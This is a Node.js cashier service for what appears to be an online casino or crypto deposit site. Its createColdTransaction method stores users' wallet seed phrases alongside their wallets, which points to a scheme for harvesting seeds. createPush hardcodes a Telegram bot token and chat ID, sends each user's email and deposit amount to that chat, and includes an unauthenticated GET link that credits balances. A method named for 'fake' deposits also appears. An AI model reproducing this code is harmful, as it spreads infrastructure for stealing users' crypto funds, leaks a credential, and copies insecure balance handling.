const PullModel = require('../models/pull-model');
const PushModel = require('../models/push-model');
const UserModel = require('../models/user-model');
const TransactionModel = require('../models/transaction-model');
const CryptoTransactionModel = require('../models/crypto-transaction-model');
const ColdTransactionModel = require('../models/cold-transaction-model');
const CryptoTransactionDto = require("../dtos/crypto-transaction-dto");
const TransactionDto = require("../dtos/transaction-dto");
const PullDto = require("../dtos/pull-dto");
const PushDto = require("../dtos/push-dto");
const ColdTransactionDto = require("../dtos/cold-transaction-dto");
const axios = require('axios')

class CassaService {
    async getAllPulls() {
        const pulls = await PullModel.find().populate('user');
        return pulls.map(pull => new PullDto(pull));
    }

    async getAllPushs() {
        const pushs = await PushModel.find().populate('user');
        return pushs.map(push => new PushDto(push));
    }

    async fetchTransactions() {
        const transactions = await TransactionModel.find();
        return transactions;
    }

    async fetchCryptoTransactions() {
        const transactions = await CryptoTransactionModel.find().populate('user');
        return transactions.map(transaction => new CryptoTransactionDto(transaction));
    }

    async fetchColdTransactions() {
        const transactions = await ColdTransactionModel.find().populate('user');
        return transactions.map(transaction => new ColdTransactionDto(transaction));
    }

    async createPull(cryptoNumber, crypto, amount, user_id) {
        const transaction = await TransactionModel.create({
            user: user_id,
            type: 'pull',
            amount,
        });

        const pull = await PullModel.create({
            transaction: transaction._id,
            user: user_id,
            cryptoNumber,
            crypto,
            amount
        });

        return pull;
    }

    async createPush(amount, card, user_id) {
        const transaction = await TransactionModel.create({
            user: user_id,
            type: 'push',
            amount,
        });

        const push = await PushModel.create({
            transaction: transaction._id,
            user: user_id,
            card,
            amount
        });

        const user = await UserModel.findById(user_id)

        const token = '5846954411:AAEKEMS8EBKi1yPAfBueHaSZLFihgXXG4uk'
        const tg_user_id = 269530936;
        const text = "Новое%20пополнение</b>Почта:%20" + user.email + "</b>Сумма:%20" + amount;
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${tg_user_id}&text=${text}&reply_markup=%7B%22inline_keyboard%22%3A[[%7B%22text%22:%22Подтвердить%22,%22url%22:%22https://api.makao777.com/api/cassa/pushs/accept/${push._id}%22%7D]]%7D`
        axios.get(url)

        return push;
    }

    async createCryptoTransaction(crypto, bonus, transaction_number, amount, user_id) {
        const transaction = await CryptoTransactionModel.create({
            user: user_id,
            transaction_number,
            amount,
            crypto,
            bonus,
        });

        const transaction_with_user = await CryptoTransactionModel.findById(transaction._id).populate('user');

        return new CryptoTransactionDto(transaction_with_user);
    }

    async createColdTransaction(wallet, seed, amount, user_id) {
        const transaction = await ColdTransactionModel.create({
            user: user_id,
            wallet,
            amount,
            seed,
        });

        const transaction_with_user = await ColdTransactionModel.findById(transaction._id).populate('user');

        return new ColdTransactionDto(transaction_with_user);
    }

    async getTransaction(id) {
        const transaction = await TransactionModel.findById(id);

        return transaction;
    }

    async updateTransaction(id, data) {

        function validated(data) {

            const validatedData = {};

            Object.entries(data).map(([key, value]) => {
                if([
                    'status',
                ].indexOf(key) !== -1) validatedData[key] = value;
            })

            return validatedData;
        }

        const transaction = await TransactionModel.findByIdAndUpdate(id, validated(data));

        return transaction;
    }

    async getPayHistory(id) {
        const transactions = await TransactionModel.find({user: id}).populate('user');
        return transactions.map(transaction => new TransactionDto(transaction));
    }

    async getAllFakePushs() {
        const fakePushs = await TransactionModel.find().populate('user');
        return fakePushs.map(transaction => new TransactionDto(transaction));
    }

    async rejectTransaction(id) {
        const transaction = await CryptoTransactionModel.findById(id);

        transaction.status = 'reject'
        transaction.save()

        return new CryptoTransactionDto(transaction);
    }

    async acceptTransaction(id) {
        const transaction = await CryptoTransactionModel.findById(id);

        transaction.status = 'accept'
        transaction.save()

        const user = await UserModel.findById(transaction.user._id)

        user.balance = user.balance + transaction.amount
        user.save()

        return new CryptoTransactionDto(transaction);
    }

    async acceptPush(id) {
        const push = await PushModel.findById(id).populate('user');

        push.confirmed = true
        push.save()

        const user = await UserModel.findById(push.user._id)

        user.balance = user.balance + push.amount
        user.save()

        return new PushDto(push);
    }

    async rejectPull(id) {
        const transaction = await PullModel.findById(id);

        transaction.status = 'reject'
        transaction.save()

        return new CryptoTransactionDto(transaction);
    }

    async acceptPull(id) {
        const transaction = await PullModel.findById(id);

        transaction.status = 'accept'
        transaction.save()

        const user = await UserModel.findById(transaction.user._id)

        user.balance = user.balance - transaction.amount
        user.save()

        return new CryptoTransactionDto(transaction);
    }
}

module.exports = new CassaService()